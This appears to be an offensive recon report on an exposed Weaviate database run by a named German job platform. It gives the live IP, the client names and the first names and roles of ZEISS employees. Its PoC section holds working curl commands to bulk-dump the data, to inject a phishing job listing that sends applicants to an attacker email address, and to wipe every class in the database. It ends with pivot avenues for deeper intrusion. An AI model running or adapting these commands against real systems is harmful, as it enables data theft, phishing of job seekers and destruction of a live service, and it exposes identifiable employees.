# Ikigai -- Unauth Read + Partial Write on German Job Platform RAG

**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** HIGH
**Status:** CONFIRMED -- unauth read + delete; write creates objects without vectors

---

## Target

```
IP:       34.1.233.6
Port:     8080
Service:  Weaviate 1.31.9
Hosting:  Google Cloud Platform, Netherlands
RDNS:     6.233.1.34.bc.googleusercontent.com
Auth:     NONE
Module:   text2vec-openai (client-key pattern -- key not in server env)
```

---

## Operator Attribution

**Ikigai** -- German AI-powered job search and employer branding platform.

Evidence:
- Azure OpenAI resource name in module config: `get-ikigai-openai-sweden`
- 27 EmployerBranding records for `customer_id: zeiss` = Carl Zeiss AG
- Job listings from STACKIT (Schwarz Group cloud arm, Neckarsulm HQ), ams-OSRAM, MediaMarkt

---

## Data (3 Classes, ~9,513 records)

| Class | Records | Content |
|-------|---------|---------|
| Job | 9,361 | German job listings with location, description, company |
| JobAzure | 125 | Azure-sourced job listings |
| EmployerBranding | 27 | ZEISS named employee career stories |

### Clients Identified (customer_id values)

**Job class (sample 200):**
```
entrepreneursclub  183  -- primary aggregator feed
ams_osram            6  -- ams-OSRAM (semiconductor, Austria/Germany)
zeiss                4  -- Carl Zeiss AG (optics/semiconductor, Oberkochen)
bwk                  2
munich_2vd           2
mediamarkt           1  -- MediaMarkt (consumer electronics retail)
cosmoconsult         1  -- Cosmo Consult (SAP partner)
schwarz              1  -- Schwarz Group (Lidl/Kaufland parent)
```

**JobAzure class (125 total):**
```
munich_3vd          60
munich_2vd          55
munich_bsak         10
```

**EmployerBranding:** 27 records, all `customer_id: zeiss`

### EmployerBranding -- Named ZEISS Employees

Stories identify real ZEISS employees by first name and role:

```
story_fabian     Fabian - Projektingenieur und Teamplayer
story_camila     Curitiba, Stuttgart, Oberkochen       (Camila)
story_ella       Ein Quantum Physik                    (Ella)
story_martin_2   Martin - Schritt für Schritt zum Fertigungsprojektleiter
story_ondrej     Vom Spezialisten zum Generalisten     (Ondrej)
story_christian  Die Menschlichkeit im IT-System       (Christian - Leiter IT Dev)
story_daniel     Daniel - Sensorik für die Chips von morgen
story_selina     Mit Handarbeit die Zukunft gestalten  (Selina - Feinoptikerin)
story_marina     Marina - Eine Projektleiterin in Bewegung
story_marc       Auf zu den Sternen                    (Marc)
story_larissa    Larissa tüftelt für die letzten Pikometer (Larissa - Entwicklungsingenieurin)
```

Full biographical text, role titles, and project details per employee.

### Job Records -- Structure

```
internal_id      text     -- platform job ID (o_<alphanumeric>)
customer_id      text     -- client company identifier
title            text     -- job title
description      text     -- full job description (German)
location         text     -- location string
city             text
country_code     text     -- ISO country code
latitude         float    -- geolocation
longitude        float
homeoffice       int      -- remote work flag
title_generated  text     -- LLM-generated normalized title
tasks_generated  text     -- LLM-generated task summary
work_tags        text[]   -- categorization tags
```

---

## Access Matrix

| Operation | Result | Notes |
|-----------|--------|-------|
| Read | YES -- full | 9,513 records accessible, all fields |
| Write (vectorized) | BLOCKED | requires `X-OpenAI-Api-Key` header |
| Write (no vector) | YES | object created, unindexed -- persists in DB |
| Delete | YES | 204 |
| nearText semantic search | BLOCKED | same key requirement |

**Key behavior:** `text2vec-openai` is configured client-key pattern -- the OpenAI key is NOT stored server-side (`OPENAI_APIKEY` env unset). Write without the key creates an unvectorized object. Read and delete require no key.

Write error: `"API Key: no api key found neither in request header: X-Openai-Api-Key nor in environment variable under OPENAI_APIKEY"`

Two canary objects created, confirmed, deleted (204, verify 404).

---

## PoC

### Read -- Full Job Corpus

```bash
TARGET=http://34.1.233.6:8080

# Schema
curl -s $TARGET/v1/schema | jq '[.classes[] | {class: .class, count: "?"}]'

# Scroll all jobs
AFTER=""
while true; do
  Q='{"query":"{ Get { Job(limit: 100) { title customer_id city description internal_id } } }"}'
  RESULT=$(curl -s -X POST $TARGET/v1/graphql -H "Content-Type: application/json" -d "$Q")
  echo "$RESULT" >> ikigai-jobs.jsonl
  COUNT=$(echo $RESULT | jq '.data.Get.Job | length')
  [ "$COUNT" -lt 100 ] && break
  AFTER=$(echo $RESULT | jq -r '.data.Get.Job[-1] | ._additional.id // empty')
done

# All ZEISS employee stories
curl -s "$TARGET/v1/objects?class=EmployerBranding&limit=27" \
  | jq '.objects[].properties | {name: .internal_id, title: .title, description: .description[:200]}'
```

### Write -- Inject Phantom Job Listing

```bash
# Object created without vector -- appears in BM25 keyword search but not semantic search
# Useful for injecting misleading job data into keyword-based results
curl -s -X POST $TARGET/v1/batch/objects \
  -H "Content-Type: application/json" \
  -d '{
    "objects": [{
      "class": "Job",
      "properties": {
        "title": "Senior Engineer - ZEISS Semiconductor (Remote)",
        "customer_id": "zeiss",
        "internal_id": "o_attacker001",
        "description": "Send CV to jobs@attacker.com for ZEISS semiconductor division.",
        "city": "Oberkochen",
        "country_code": "de",
        "latitude": 48.7847,
        "longitude": 10.1049
      }
    }]
  }' | jq '.[0].result'
# status: FAILED (no vector) but object persists in DB
```

### Delete -- Class Wipe

```bash
curl -X DELETE $TARGET/v1/schema/Job
curl -X DELETE $TARGET/v1/schema/JobAzure
curl -X DELETE $TARGET/v1/schema/EmployerBranding
# 9,513 records + all HNSW vectors gone
# lastSnapshotIndex: 0 -- no recovery point
```

---

## Topology

```
node: main_node  status=HEALTHY  version=1.31.9
operationalMode: ReadWrite
lastSnapshotIndex: 0
```

---

## Impact

### Read -- Job Corpus Exfiltration
9,361 German job listings with full descriptions, geolocation (lat/long), and company attribution. Competitor intelligence: which companies are hiring, for what roles, in what locations. Bulk exfiltration with no rate limiting.

### Read -- ZEISS Named Employee Profiles
27 EmployerBranding stories identify ZEISS employees by first name with full professional biography, role title, project descriptions, and career narrative. GDPR-relevant personal data (name + employment role + employer = identifiable natural persons). ZEISS has not authorized this data to be exposed via an unauthenticated endpoint.

### Write -- Phantom Job Injection
Without a vector, injected objects appear in BM25 keyword search results but not semantic nearText. An attacker controlling the platform could inject fake job listings under legitimate customer IDs (`customer_id: zeiss`) to phish candidates -- directing applicants to attacker-controlled URLs. Objects persist until explicitly deleted.

### Delete -- Full Platform Wipe
Three schema deletes destroy the entire Ikigai job platform data layer. `lastSnapshotIndex: 0` means Weaviate has no recovery point. Jobs must be re-indexed from source.

---

## Pivot Avenues

1. **OpenAI key source** -- key is client-supplied per request; find where the Ikigai application stores it (env vars, secrets manager, frontend bundle) to enable full vectorized writes and nearText reads
2. **entrepreneursclub feed** -- 9,000+ jobs from German companies aggregated under one customer_id; identify the source platform for operator attribution and potential deeper access
3. **munich_3vd / munich_2vd / munich_bsak** -- unidentified Munich-based clients in JobAzure; likely automotive (VD = automotive dealer network?) or major German enterprise
4. **GCP neighborhood** -- 34.1.233.0/24; other Ikigai services may be co-located (API backend, frontend, admin)
5. **Azure OpenAI `get-ikigai-openai-sweden`** -- resource name confirms Ikigai's Azure subscription in Sweden region; pivot to Azure surface if admin access found

---

## Tool Reference

Found with **weavscan**.
https://github.com/nuclide-research/weavscan
